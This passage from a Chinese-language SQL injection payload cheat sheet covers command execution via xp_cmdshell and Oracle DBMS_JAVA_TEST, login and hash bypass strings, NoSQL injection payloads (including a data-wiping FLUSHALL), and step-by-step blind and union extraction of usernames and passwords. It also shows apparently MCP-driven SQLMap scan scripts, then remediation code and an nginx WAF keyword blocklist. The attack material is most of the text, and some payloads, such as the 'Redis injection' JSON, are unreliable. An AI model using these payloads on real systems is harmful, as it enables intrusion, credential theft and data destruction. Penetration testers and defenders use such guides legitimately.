RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
EXEC xp_cmdshell 'whoami'
```

### 16.4 Oracle 命令执行

```sql
-- 使用 DBMS_JAVA_TEST（需要特定权限）
BEGIN DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/sh','-c','id'); END;
EXEC DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/sh','-c','id');
```

---

## 十七、绕过认证

### 17.1 登录绕过

```sql
-- 基础绕过
admin' --
admin' OR '1'='1'--
admin' OR 1=1--
admin'--

-- 密码绕过
' OR '1'='1'--
' OR 1=1--
' OR 1=1#
' OR 1=1--
```

### 17.2 哈希绕过

```sql
-- MD5 绕过
' OR 1=1 UNION SELECT 'admin', MD5('admin')--
' OR 1=1 UNION SELECT 'admin', '21232f297a57a5a743894a0e4a801fc3'--

-- SHA1 绕过
' OR 1=1 UNION SELECT 'admin', SHA1('admin')--
' OR 1=1 UNION SELECT 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997'--
```

### 17.3 会话劫持

```sql
-- 提取会话 ID
' UNION SELECT session_id,NULL FROM sessions WHERE username='admin'--

-- 提取 Cookie
' UNION SELECT cookie,NULL FROM cookies WHERE username='admin'--
```

---

## 十八、NoSQL 注入

### 18.1 MongoDB 注入

```javascript
// 基础注入
{"username": {"$ne": null}, "password": {"$ne": null}}

// 认证绕过
{"username": "admin", "password": {"$ne": null}}
{"username": {"$ne": null}, "password": {"$ne": null}}

// 提取数据
{"username": {"$regex": ".*"}, "password": {"$ne": null}}

// 时间盲注
{"username": {"$ne": null}, "password": {"$where": "sleep(5000)"}}

// 盲注
{"username": {"$regex": "^a.*"}, "password": {"$ne": null}}
{"username": {"$regex": "^ad.*"}, "password": {"$ne": null}}
```

### 18.2 Redis 注入

```javascript
// 基础注入
{"username": "admin", "password": {"$ne": null}}

// 命令执行
{"username": "admin", "password": {"$eval": "return redis.call('FLUSHALL')"}}
```

### 18.3 Elasticsearch 注入

```json
// 基础注入
{
  "query": {
    "bool": {
      "must": [
        {"match": {"username": "admin"}},
        {"match": {"password": {"$ne": null}}}
      ]
    }
  }
}
```

---

## 十九、实战案例

### 19.1 案例 1：基础 SQL 注入

**目标**：`http://example.com/product?id=1`

**步骤**：
1. 测试基础 Payload：`' OR 1=1--`
2. 观察响应变化
3. 确认漏洞存在
4. 提取数据库名：`' UNION SELECT database(),2,3--`
5. 提取表名：`' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--`
6. 提取列名：`' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--`
7. 提取数据：`' UNION SELECT username,password,3 FROM users--`

### 19.2 案例 2：盲注

**目标**：`http://example.com/search?q=test`

**步骤**：
1. 测试布尔盲注：`' AND 1=1--` 和 `' AND 1=2--`
2. 观察响应差异
3. 提取数据库名：`' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--`
4. 逐字符提取：`' AND ASCII(SUBSTRING((SELECT database()),1,1))=115--`  -- 's'
5. 提取表名：`' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>64--`
6. 提取列名：`' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))>64--`
7. 提取数据：`' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1))>64--`

### 19.3 案例 3：时间盲注

**目标**：`http://example.com/search?q=test`

**步骤**：
1. 测试时间盲注：`' AND SLEEP(5)--`
2. 观察响应时间
3. 提取数据库名：`' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0)--`
4. 逐字符提取：`' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=115,SLEEP(5),0)--`  -- 's'
5. 提取表名：`' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>64,SLEEP(5),0)--`
6. 提取列名：`' AND IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))>64,SLEEP(5),0)--`
7. 提取数据：`' AND IF(ASCII(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1))>64,SLEEP(5),0)--`

### 19.4 案例 4：过滤绕过

**目标**：`http://example.com/search?q=test`

**过滤规则**：过滤空格、注释符、关键字

**步骤**：
1. 尝试注释符替代空格：`'/**/OR/**/1=1--`
2. 尝试换行符替代空格：`'%0AOR%0A1=1--`
3. 尝试编码绕过：`%27%20OR%201%3D1--`
4. 尝试大小写绕过：`' oR 1=1--`
5. 验证成功的 Payload

### 19.5 案例 5：登录绕过

**目标**：`http://example.com/login`

**步骤**：
1. 测试用户名：`admin' --`
2. 测试密码：`' OR '1'='1'--`
3. 测试组合：`admin' OR '1'='1'--`
4. 验证成功的 Payload
5. 提取管理员凭证

### 19.6 案例 6：使用 MCP SQLMap 自动扫描

**目标**：`http://example.com/product?id=1`

**步骤**：
1. 准备 HTTP 请求报文：
   ```
   GET /product?id=1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n\n
   ```

2. 调用 `submit_scan` 提交扫描任务：
   ```python
   task_id = submit_scan(
       http_request="GET /product?id=1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n\n"
   )
   ```

3. 使用 `check_scan_status` 查询扫描状态：
   ```python
   while True:
       status = check_scan_status(task_id)
       if status == "completed":
           break
       time.sleep(5)
   ```

4. 使用 `get_scan_result` 获取扫描结果：
   ```python
   result = get_scan_result(task_id)
   print(result)
   ```

5. 分析扫描结果：
   ```
   🚨 SUCCESS! 发现 SQL 注入漏洞!
   📋 检测到的注入类型: Boolean盲注, 报错注入, 时间盲注, 联合查询注入
   🎯 注入类型数量: 4
   
   详细信息：
   - 注入点: id
   - Payload: ' OR 1=1--
   - 数据库类型: MySQL
   - 数据库版本: 5.7.33
   - 当前数据库: testdb
   - 当前用户: root@localhost
   ```

### 19.7 案例 7：MCP SQLMap 批量扫描

**目标**：批量扫描多个 URL

**步骤**：
1. 准备多个 HTTP 请求报文：
   ```python
   requests = [
       "GET /product1?id=1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n\n",
       "GET /product2?id=1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n\n",
       "GET /product3?id=1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n\n"
   ]
   ```

2. 并发调用 `submit_scan` 提交多个扫描任务：
   ```python
   task_ids = []
   for req in requests:
       task_id = submit_scan(http_request=req)
       task_ids.append(task_id)
   ```

3. 使用 `list_all_tasks` 查看所有任务状态：
   ```python
   tasks = list_all_tasks()
   print(tasks)
   ```

4. 逐个获取扫描结果：
   ```python
   results = []
   for task_id in task_ids:
       result = get_scan_result(task_id)
       results.append(result)
   ```

5. 汇总分析并生成报告：
   ```python
   for i, result in enumerate(results):
       print(f"目标 {i+1}:")
       print(result)
       print("-" * 50)
   ```

### 19.8 案例 8：MCP SQLMap + 手动测试结合

**目标**：`http://example.com/product?id=1`

**步骤**：
1. 使用 MCP SQLMap 自动扫描：
   ```python
   http_request = "GET /product?id=1 HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n\n"
   task_id = submit_scan(http_request=http_request)
   result = get_scan_result(task_id)
   ```

2. 分析自动扫描结果，确认漏洞存在：
   ```python
   if "SUCCESS" in result:
       print("自动扫描发现漏洞")
   ```

3. 基于扫描结果进行手动测试：
   ```python
   # 使用扫描结果中的 Payload 进行手动验证
   test_payloads = [
       "' OR 1=1--",
       "' UNION SELECT 1,2,3--",
       "' AND SLEEP(5)--"
   ]
   
   for payload in test_payloads:
       # 发送测试请求
       # 观察响应
       # 记录结果
       pass
   ```

4. 深入利用漏洞：
   ```python
   # 提取数据库信息
   extract_payload = "' UNION SELECT database(),user(),version()--"
   
   # 提取表结构
   tables_payload = "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--"
   
   # 提取敏感数据
   data_payload = "' UNION SELECT username,password,3 FROM users--"
   ```

### 19.9 案例 9：POST 请求的 MCP SQLMap 扫描

**目标**：`http://example.com/login`

**步骤**：
1. 准备 POST 请求报文：
   ```
   POST /login HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 25\nUser-Agent: Mozilla/5.0\n\nusername=admin&password=123
   ```

2. 调用 `submit_scan` 提交扫描任务：
   ```python
   http_request = "POST /login HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 25\nUser-Agent: Mozilla/5.0\n\nusername=admin&password=123"
   task_id = submit_scan(http_request=http_request)
   ```

3. 获取扫描结果：
   ```python
   result = get_scan_result(task_id)
   print(result)
   ```

4. 分析扫描结果：
   ```
   🚨 SUCCESS! 发现 SQL 注入漏洞!
   📋 检测到的注入类型: Boolean盲注, 联合查询注入
   
   详细信息：
   - 注入点: username
   - Payload: admin' OR '1'='1'--
   - 数据库类型: MySQL
   - 当前数据库: testdb
   ```

### 19.10 案例 10：带 Cookie 的 MCP SQLMap 扫描

**目标**：`http://example.com/admin/dashboard`

**步骤**：
1. 准备带 Cookie 的请求报文：
   ```
   GET /admin/dashboard HTTP/1.1\nHost: example.com\nCookie: session_id=abc123; user_token=xyz789\nUser-Agent: Mozilla/5.0\n\n
   ```

2. 调用 `submit_scan` 提交扫描任务：
   ```python
   http_request = "GET /admin/dashboard HTTP/1.1\nHost: example.com\nCookie: session_id=abc123; user_token=xyz789\nUser-Agent: Mozilla/5.0\n\n"
   task_id = submit_scan(http_request=http_request)
   ```

3. 获取扫描结果：
   ```python
   result = get_scan_result(task_id)
   print(result)
   ```

4. 分析扫描结果：
   ```
   🚨 SUCCESS! 发现 SQL 注入漏洞!
   📋 检测到的注入类型: 时间盲注
   
   详细信息：
   - 注入点: Cookie 中的 session_id
   - Payload: ' AND SLEEP(5)--
   - 数据库类型: MySQL
   ```

---

## 二十、安全修复建议

### 20.1 输入验证

```python
# 使用白名单验证
import re

def validate_username(username):
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username

# 严格类型检查
def validate_id(id):
    try:
        return int(id)
    except ValueError:
        raise ValueError("Invalid ID")
```

### 20.2 参数化查询

```python
# Python - MySQL
import mysql.connector

def get_user(user_id):
    conn = mysql.connector.connect(user='root', password='password', host='localhost', database='test')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
    result = cursor.fetchall()
    conn.close()
    return result

# Python - PostgreSQL
import psycopg2

def get_user(user_id):
    conn = psycopg2.connect(user='postgres', password='password', host='localhost', database='test')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
    result = cursor.fetchall()
    conn.close()
    return result

# Python - SQL Server
import pyodbc

def get_user(user_id):
    conn = pyodbc.connect('DRIVER={SQL Server};SERVER=localhost;DATABASE=test;UID=sa;PWD=password')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    result = cursor.fetchall()
    conn.close()
    return result
```

### 20.3 使用 ORM

```python
# Python - SQLAlchemy
from sqlalchemy import create_engine, text

engine = create_engine('mysql://root:password@localhost/test')

def get_user(user_id):
    with engine.connect() as conn:
        result = conn.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})
        return result.fetchall()

# Python - Django
from django.db import connection

def get_user(user_id):
    with connection.cursor() as cursor:
        cursor.execute("SELECT * FROM users WHERE id = %s", [user_id])
        return cursor.fetchall()
```

### 20.4 最小权限原则

```sql
-- 创建受限用户
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';

-- 授予最小权限
GRANT SELECT, INSERT, UPDATE ON testdb.users TO 'webapp'@'localhost';

-- 禁用危险函数
REVOKE FILE ON *.* FROM 'webapp'@'localhost';
```

### 20.5 错误处理

```python
# 不显示详细错误信息
import logging

def get_user(user_id):
    try:
        conn = mysql.connector.connect(user='root', password='password', host='localhost', database='test')
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
        result = cursor.fetchall()
        conn.close()
        return result
    except Exception as e:
        logging.error(f"Database error: {e}")
        raise Exception("Database error occurred")
```

### 20.6 WAF 部署

```nginx
# Nginx WAF 配置
location / {
    # 阻止 SQL 注入攻击
    if ($args ~* "union.*select.*from") {
        return 403;
    }
    if ($args ~* "or.*1=1") {
        return 403;
    }
    if ($args ~* "and.*1=1") {
        return 403;
    }
    if ($args ~* "drop.*table") {
        return 403;
    }
    if ($args ~* "exec.*xp_cmdshell") {
        return 403;
    }
}
```

---

## 总结

SQL 注入是一种严重的 Web 应用程序漏洞，攻击者可以通过注入恶意 SQL 代码来操纵数据库。本指南提供了全面的 SQL 注入 Payload 和绕过技术，包括：

1. **基础注入**：经典注入、联合查询注入、错误注入
2. **盲注**：布尔盲注、时间盲注
3. **高级技术**：堆叠查询注入、二阶注入、命令执行
4. **绕过技术**：编码绕过、过滤绕过、WAF 绕过
5. **数据库特定**：MySQL、PostgreSQL、SQL Server、Oracle、SQLite
6. **实战案例**：真实的渗透测试场景

**重要提醒**：
- 仅在授权范围内进行测试
- 遵守相关法律法规
- 及时报告发现的漏洞
- 保护测试过程中获取的敏感信息

---

**文档版本**: 1.0
**最后更新**: 2026-02-09
